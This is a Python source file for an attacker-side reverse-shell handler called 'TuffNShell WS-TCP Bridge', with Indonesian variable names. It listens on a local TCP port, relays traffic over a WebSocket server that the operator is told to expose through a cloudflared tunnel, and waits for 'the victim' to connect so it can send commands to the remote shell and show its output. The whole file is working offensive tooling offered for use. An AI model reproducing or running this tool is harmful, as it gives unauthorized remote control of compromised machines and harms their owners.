import os
import asyncio
import websockets
import sys

os.system('clear')

warna_biru_tebal = "\033[1;34m"
reset_warna = "\033[0m"

banner = r"""
  ______      _________   _______ __         ____
 /_  __/_  __/ __/ __/ | / / ___// /_  ___  / / /
  / / / / / / /_/ /_/  |/ /\__ \/ __ \/ _ \/ / /
 / / / /_/ / __/ __/ /|  /___/ / / / /  __/ / /
/_/  \__,_/_/ /_/ /_/ |_//____/_/ /_/\___/_/_/

TuffNShell WS-TCP Bridge
"""

print(f"{warna_biru_tebal}{banner}{reset_warna}")
print(f"Simple Reverse Shell use WS-TCP Bridge (100% Free)")

LOCAL_TCP_PORT = 4444
WS_PORT = 8081

print()

async def handle_shell_session(reader, writer):
    print(f"\n\033[1;32m--> Connect!\033[0m", flush=True)
    print(f"\033[1;33m--> Create shell session...\033[0m\n", flush=True)
    
    loop = asyncio.get_event_loop()
    prompt = "\n\033[1;36m>\033[0m "

    async def forward_stdin():
        try:
            sys.stdout.write(prompt)
            sys.stdout.flush()
            while True:
                cmd = await loop.run_in_executor(None, sys.stdin.readline)
                if not cmd:
                    break
                writer.write(cmd.encode('utf-8'))
                await writer.drain()
                await asyncio.sleep(0.2)
                sys.stdout.write(prompt)
                sys.stdout.flush()
        except Exception:
            pass

    async def forward_stdout():
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    print("\n\033[1;31m[-] Disconnect from victim\033[0m")
                    break
                sys.stdout.write(data.decode('utf-8', errors='ignore'))
                sys.stdout.flush()
        except Exception:
            pass

    await asyncio.gather(forward_stdin(), forward_stdout())
    writer.close()
    await writer.wait_closed()

async def forward_data(reader, writer, websocket):
    async def ws_to_tcp():
        async for msg in websocket:
            if isinstance(msg, str):
                msg = msg.encode()
            writer.write(msg)
            await writer.drain()
    async def tcp_to_ws():
        while True:
            data = await reader.read(4096)
            if not data:
                break
            await websocket.send(data)
    await asyncio.gather(ws_to_tcp(), tcp_to_ws())

async def ws_handler(websocket):
    print(f"--> Connect ", flush=True)
    try:
        reader, writer = await asyncio.open_connection('127.0.0.1', LOCAL_TCP_PORT)
        await forward_data(reader, writer, websocket)
    except Exception as e:
        print(f"--> ERROR {LOCAL_TCP_PORT}: {e}", flush=True)

async def main():
    tcp_server = await asyncio.start_server(handle_shell_session, '127.0.0.1', LOCAL_TCP_PORT)

    async with websockets.serve(ws_handler, "127.0.0.1", WS_PORT):
        print(f"--> Tunnel run on 127.0.0.1:{WS_PORT} - DONT CLOSE THIS TAB", flush=True)
        print("Run cloudflared tunnel --url http://localhost:8081")
        print("if it has been run before then ignore this message")
        print()
        print("Waiting connection from victim... ")
        await asyncio.Future()

asyncio.run(main())
